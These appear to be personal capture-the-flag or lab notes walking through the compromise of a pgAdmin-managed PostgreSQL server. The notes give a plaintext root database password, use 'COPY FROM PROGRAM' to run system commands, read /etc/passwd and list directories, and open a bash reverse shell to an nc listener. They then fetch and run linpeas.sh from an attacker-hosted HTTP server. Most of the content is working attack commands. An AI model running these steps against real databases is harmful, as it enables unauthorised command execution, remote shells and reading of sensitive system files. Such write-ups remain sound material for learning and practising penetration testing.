
Once connected to pgAdmin web:

#pgAdmin_Web
1. Add a PostgreSQL server: *Servers right-click -> Register -> Server*.

```
Host : `172.18.0.3`
Port : `5432`
Database : `ps_db`
Username : `root`
Password : PsqLR00tpaSS11
```

![[PostgresSQLServer.png]]

![[register_server1-1.png|562x441]]

![[register_server2.png|565x441]]


2. Open Query Tool  *ps_db  -> Schemas -> Public -> Tables -> right-click Query Tool*  , paste the code below and execute clicking on :![[play.png]]

```
DROP TABLE IF EXISTS cmd_test;
CREATE TABLE cmd_test(output text);
COPY cmd_test FROM PROGRAM 'whoami';
SELECT * FROM cmd_test;
```

![[query1.png]]


Result: Command execution confirmed as postgres user.

![[data_output.png]]

4. Try to execute system commands from `PgAdmin`. 


```
SELECT pg_ls_dir('/'); -- This works, returns directories
SELECT pg_read_file('/etc/passwd'); -- We can read files
```

#Attaking_machine 
5. Reverse shell: Prepare listener on Kali:

```
nc -lvnp 4445
```

#pgAdmin_Web 
6. Delete the code from the Query Tool and run the following code:

```
DROP TABLE IF EXISTS cmd;
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4445 0>&1"';
```
Result: Shell as `postgres` in the PostgreSQL container (172.18.0.3).

## linpeas

#Attacking_machine 
- Open a *python http server*.

```
python3 -m http.server 80
```

#PostgresSQL_Container_Shell
Download *linpeas.sh* to enumerate the machine.

```
cd /tmp

postgres@858fdf51af59:/tmp$ perl -MHTTP::Tiny -e 'HTTP::Tiny->new->mirror("http://10.10.17.219/linpeas.sh","linpeas.sh")'

chmod +x linpeas.sh
./linpeas.sh
```



